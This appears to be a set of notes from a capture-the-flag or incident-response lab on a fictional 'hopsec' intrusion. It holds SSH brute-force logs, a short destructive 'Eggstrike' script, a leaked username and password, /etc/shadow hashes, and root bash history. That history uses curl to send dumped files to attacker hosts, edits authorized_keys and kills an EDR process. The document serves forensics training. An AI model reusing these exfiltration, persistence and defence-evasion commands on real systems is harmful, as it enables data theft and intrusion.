tbfc-web01

2025-10-13T01:43:48.000724+00:00 tbfc-web01 sshd[1037]: Failed password for socmas from eggbox-196.hopsec.thm port 16212 ssh2
2025-10-13T01:43:52.044888+00:00 tbfc-web01 sshd[1037]: Failed password for socmas from eggbox-196.hopsec.thm port 16212 ssh2
2025-10-13T01:43:55.543374+00:00 tbfc-web01 sshd[1037]: Failed password for socmas from eggbox-196.hopsec.thm port 16212 ssh2
2025-10-13T01:45:08.123120+00:00 tbfc-web01 sshd[2392]: Failed password for socmas from eggbox-196.hopsec.thm port 20393 ssh2
2025-10-13T01:45:11.440030+00:00 tbfc-web01 sshd[2392]: Failed password for socmas from eggbox-196.hopsec.thm port 20393 ssh2
2025-10-13T01:46:01.816094+00:00 tbfc-web01 sshd[2392]: Failed password for socmas from eggbox-196.hopsec.thm port 20393 ssh2
2025-10-13T01:46:07.558636+00:00 tbfc-web01 sshd[2453]: Failed password for socmas from eggbox-196.hopsec.thm port 14040 ssh2


cat $(find /home/socmas -name *egg*)
# Eggstrike v0.3
# © 2025, Sir Carrotbane, HopSec
cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Chistmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"


---

username: eddi_knapp
password: S0mething1Sc0ming

Commands from root bash history
```
nano .ssh/authorized_keys 
curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
curl --data "THM{REDAACTED}" http://flag.hopsec.thm
pkill tbfcedr
```

passwords from /etc/shadow of web01

```
mcskidy:$y$j9T$I3LXHt7JUwiHD0TTxzyJB/$E8FghGRUwK/vo4V14rwnCl1.bX6Gv.MYoK2/TC.iIE3:20369:0:99999:7:::
eddi_knapp:$y$j9T$hYcXKeXyBLZFwRzJnKnHK/$ytDhFsnIkTcVuAwA/azH3P9PETRE41fWaF98kwknfcA:20370:0:99999:7:::
socmas:$y$j9T$TlTVx6QreJVaYivZ3FF7S1$zYs1BdELO2kCyuKzZqVFrQ7eUBq0ctskmw4.W.ktYs2:20403:0:99999:7:::
```

